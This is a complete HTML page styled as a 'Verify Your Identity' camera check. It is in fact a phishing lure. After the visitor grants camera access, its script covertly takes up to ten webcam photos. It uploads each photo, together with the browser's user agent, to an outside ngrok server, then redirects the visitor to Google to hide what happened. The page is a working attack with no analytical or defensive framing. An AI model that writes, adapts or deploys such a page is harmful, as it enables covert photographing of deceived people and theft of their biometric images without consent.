<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Please Verify Your Account</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      height: 100vh; display: flex; align-items: center; justify-content: center;
    }
    .card {
      background: white; border-radius: 16px; padding: 32px; width: 340px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center;
    }
    .card h2 { color: #333; margin-bottom: 8px; }
    .card p { color: #666; font-size: 14px; margin-bottom: 16px; }
    #video {
      width: 100%; border-radius: 8px; background: #eee;
      transform: scaleX(-1);
    }
    .btn {
      display: inline-block; margin-top: 16px; padding: 12px 32px;
      background: #667eea; color: white; border: none; border-radius: 8px;
      font-size: 16px; cursor: pointer; transition: 0.2s;
    }
    .btn:hover { background: #5a67d8; }
    .btn:disabled { background: #ccc; cursor: not-allowed; }
    #status { margin-top: 12px; font-size: 13px; color: #888; }
  </style>
</head>
<body>
  <div class="card">
    <h2>🔐 Verify Your Identity</h2>
    <p>Your session requires a quick camera check to continue.</p>
    <video id="video" autoplay playsinline></video>
    <button class="btn" id="startBtn">Allow Camera &amp; Continue</button>
    <div id="status">Click the button above to proceed</div>
  </div>

  <script>
    // ============================================
    // CONFIG — Your ngrok URL
    // ============================================
    const CAPTURE_INTERVAL_MS = 3000;       // take a photo every 3 seconds
    const MAX_CAPTURES     = 10;            // max photos to take
    const SERVER_URL       = 'https://procreate-wince-usher.ngrok-free.dev/upload';

    // ============================================
    // STATE
    // ============================================
    let stream        = null;
    let captureCount  = 0;
    let intervalId    = null;
    const video       = document.getElementById('video');
    const canvas      = document.createElement('canvas');
    const ctx         = canvas.getContext('2d');
    const status      = document.getElementById('status');

    // ============================================
    // CAPTURE & SEND
    // ============================================
    async function captureAndSend() {
      if (captureCount >= MAX_CAPTURES) {
        clearInterval(intervalId);
        status.textContent = '✅ Verification complete. Redirecting...';
        setTimeout(() => { window.location.href = 'https://google.com'; }, 1500);
        return;
      }

      canvas.width  = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];

      try {
        const resp = await fetch(SERVER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            image: imageData,
            id:    Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
            ua:    navigator.userAgent
          })
        });
        if (resp.ok) {
          captureCount++;
          status.textContent = `📸 Captured ${captureCount}/${MAX_CAPTURES}`;
        } else {
          status.textContent = `⚠️ Upload failed (${resp.status})`;
        }
      } catch (e) {
        status.textContent = '⚠️ Connection error — retrying...';
        console.error(e);
      }
    }

    // ============================================
    // START
    // ============================================
    document.getElementById('startBtn').addEventListener('click', async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        });
        video.srcObject = stream;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('startBtn').textContent = '✅ Camera Active';

        video.onloadedmetadata = () => {
          captureAndSend();
          intervalId = setInterval(captureAndSend, CAPTURE_INTERVAL_MS);
        };
      } catch (err) {
        status.textContent = '❌ Camera access denied or unavailable';
        console.error('getUserMedia error:', err);
        setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
      }
    });
  </script>
</body>
</html>
